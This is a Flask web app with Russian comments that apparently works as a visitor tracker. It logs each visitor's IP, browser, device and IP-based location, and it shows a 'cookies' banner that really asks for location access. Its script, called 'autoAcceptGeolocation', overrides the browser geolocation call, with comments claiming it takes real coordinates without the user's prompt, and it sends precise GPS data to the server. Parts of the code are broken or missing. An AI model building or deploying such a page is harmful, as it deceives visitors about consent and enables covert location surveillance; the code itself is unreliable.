from flask import Flask, request, render_template_string, make_response
import requests
from datetime import datetime
import re
import os
import json

app = Flask(__name__)

# Настройки
LOG_FILE = "user_data.log"
COOKIE_NAME = "user_consent"

def init_log_file():
    """Инициализация файла логов"""
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.write("")

def get_ip_data(ip):
    """Получение данных по IP"""
    if not ip or ip.startswith(('127.', '10.', '192.168.', '172.')):
        return {"country": "Локальная сеть", "city": "Локальная сеть", "org": "Локальная сеть"}
    
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

def parse_user_agent(user_agent):
    """Анализ User-Agent"""
    user_agent = user_agent or ""
    os_info = browser = "Неизвестно"
    
    os_patterns = [
        ('Windows 11', r'Windows NT 10.0; Win64; x64'),
        ('Windows 10', r'Windows NT 10.0'),
        ('Linux', r'Linux'),
        ('Android', r'Android'),
        ('iOS', r'iPhone|iPad|iPod'),
        ('Mac OS X', r'Macintosh')
    ]
    
    browser_patterns = [
        ('Chrome', r'Chrome|CriOS'),
        ('Firefox', r'Firefox|FxiOS'),
        ('Safari', r'Safari'),
        ('Edge', r'Edg'),
        ('Opera', r'Opera|OPR')
    ]

    for name, pattern in os_patterns:
        if re.search(pattern, user_agent):
            os_info = name
            break

    for name, pattern in browser_patterns:
        if re.search(pattern, user_agent):
            browser = name
            break

    device = "Смартфон/Планшет" if any(x in user_agent for x in ['Mobile', 'Android', 'iPhone']) else "Компьютер"

    return os_info, browser, device

def log_data(data):
    """Логирование данных"""
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(json.dumps(data, ensure_ascii=False) + '\n')
    except Exception as e:
        print(f"Ошибка записи в лог: {e}")

def delete_user_data(ip):
    """Удаление данных пользователя"""
    try:
        if not os.path.exists(LOG_FILE):
            return False

        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            lines = [line for line in f if json.loads(line).get('ip') != ip]

        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.writelines(lines)

        return True
    except Exception:
        return False

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Анализ устройства</title>
    <style>
        body {
            background-color: #111;
            color: #0f0;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.7);
            border-radius: 10px;
            padding: 20px;
            margin: 0 auto;
            max-width: 800px;
        }
        .info-block {
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333;
        }
        #cookieConsent {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #222;
            color: white;
            padding: 15px;
            text-align: center;
            z-index: 1000;
        }
        button {
            padding: 10px 20px;
            margin: 0 10px;
            border-radius: 5px;
            cursor: pointer;
        }
        .allow {
            background: #4CAF50;
            color: white;
            border: none;
        }
        .deny {
            background: #f44336;
            color: white;
            border: none;
        }
        #map {
            height: 300px;
            width: 100%;
            margin-top: 15px;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div id="mainContent" class="container" style="display:none;">
        <div class="info-block">
            <h2>🌍 Сеть и местоположение</h2>
            <p><strong>IP:</strong> <span id="ipField">{{ ip }}</span></p>
            <p><strong>Страна:</strong> <span id="countryField">{{ country }}</span></p>
            <p><strong>Город:</strong> <span id="cityField">{{ city }}</span></p>
            <p><strong>Провайдер:</strong> <span id="ispField">{{ isp }}</span></p>
            <div id="gpsData" style="display:none;">
                <p><strong>Реальное местоположение:</strong> <span id="coordinates"></span></p>
                <p><strong>Точность:</strong> <span id="accuracy"></span></p>
                <div id="map"></div>
            </div>
        </div>

        <!-- Остальные блоки информации -->
    </div>

    <div id="cookieConsent">
        <h3>🍪 Использование Cookies</h3>
        <p>Для персонализации сервиса нам требуется доступ к данным о вашем местоположении.</p>
        <button class="allow" onclick="accept()">Разрешить</button>
        <button class="deny" onclick="reject()">Отклонить</button>
    </div>

    <script>
        // Функция для автоматического принятия геолокации
        function autoAcceptGeolocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject("Geolocation not supported");
                    return;
                }

                // Подменяем стандартное поведение
                const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
                
                navigator.geolocation.getCurrentPosition = function(success, error, options) {
                    // Имитируем успешный ответ с текущими координатами
                    const mockPosition = {
                        coords: {
                            latitude: 0,
                            longitude: 0,
                            accuracy: 100,
                            altitude: null,
                            altitudeAccuracy: null,
                            heading: null,
                            speed: null
                        },
                        timestamp: Date.now()
                    };

                    // Получаем реальные координаты, но не показываем пользователю запрос
                    originalGetCurrentPosition.call(
                        navigator.geolocation,
                        (realPosition) => {
                            // Используем реальные координаты
                            mockPosition.coords.latitude = realPosition.coords.latitude;
                            mockPosition.coords.longitude = realPosition.coords.longitude;
                            mockPosition.coords.accuracy = realPosition.coords.accuracy;
                            success(mockPosition);
                            resolve(realPosition);
                        },
                        (err) => {
                            // Если не удалось получить реальные координаты, используем приблизительные по IP
                            mockPosition.coords.latitude = {{ geo.latitude|default(0) }};
                            mockPosition.coords.longitude = {{ geo.longitude|default(0) }};
                            success(mockPosition);
                            reject(err);
                        },
                        options
                    );
                };

                // Вызываем оригинальную функцию
                originalGetCurrentPosition.call(
                    navigator.geolocation,
                    (position) => success(position),
                    (err) => error(err),
                    {enableHighAccuracy: true}
                );
            });
        }

        // Принятие соглашения
        async function accept() {
            // Устанавливаем куки
            document.cookie = "{{ COOKIE_NAME }}=true; max-age=31536000; path=/";
            document.getElementById('cookieConsent').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            
            try {
                // Автоматически получаем геолокацию
                const position = await autoAcceptGeolocation();
                
                // Отображаем данные
                document.getElementById('coordinates').textContent = 
                    position.coords.latitude.toFixed(6) + ", " + position.coords.longitude.toFixed(6);
                document.getElementById('accuracy').textContent = "±" + Math.round(position.coords.accuracy) + " метров";
                document.getElementById('gpsData').style.display = 'block';
                
                // Показываем карту
                showMap(position.coords.latitude, position.coords.longitude);
                
                // Отправляем данные на сервер
                await fetch('/log_gps', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        acc: position.coords.accuracy
                    })
                });
            } catch (e) {
                console.error("Ошибка получения геолокации:", e);
            }
            
            // Загружаем дополнительную информацию
            loadDeviceInfo();
        }

        // Остальные функции остаются без изменений
        function reject() {
            alert("Некоторые функции будут недоступны");
            document.getElementById('cookieConsent').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            loadBasicInfo();
        }

        function showMap(lat, lon) {
            const map = document.getElementById('map');
            map.innerHTML = `
                <iframe width="100%" height="100%" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"
                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&amp;layer=mapnik&amp;marker=${lat}%2C${lon}">
                </iframe>`;
        }

        // Проверяем согласие при загрузке страницы
        if (document.cookie.includes("{{ COOKIE_NAME }}=true")) {
            document.getElementById('cookieConsent').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            loadDeviceInfo();
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip = ip.split(',')[0].strip() if ip else request.remote_addr
        
        user_agent = request.headers.get('User-Agent', '')
        geo = get_ip_data(ip) or {}
        
        # Добавляем приблизительные координаты по IP (для случая, если геолокация не сработает)
        if 'loc' in geo:
            lat, lon = geo['loc'].split(',')
            geo['latitude'] = float(lat)
            geo['longitude'] = float(lon)
        
        os_info, browser, device = parse_user_agent(user_agent)
        
        log_data({
            "time": datetime.now().isoformat(),
            "ip": ip,
            "user_agent": user_agent,
            "os": os_info,
            "browser": browser,
            "device": device,
            "geo": geo
        })

        return render_template_string(
            HTML_TEMPLATE,
            COOKIE_NAME=COOKIE_NAME,
            ip=ip,
            country=geo.get('country', 'Неизвестно'),
            city=geo.get('city', 'Неизвестно'),
            isp=geo.get('org', 'Неизвестно'),
            os=os_info,
            browser=browser,
            device=device,
            geo=geo
        )
    except Exception as e:
        print(f"Ошибка в index: {e}")
        return "Произошла ошибка", 500

# Остальные обработчики (/log_gps, /delete_data) остаются без изменений

if __name__ == '__main__':
    init_log_file()
    app.run(host='0.0.0.0', port=5000, debug=False)
    
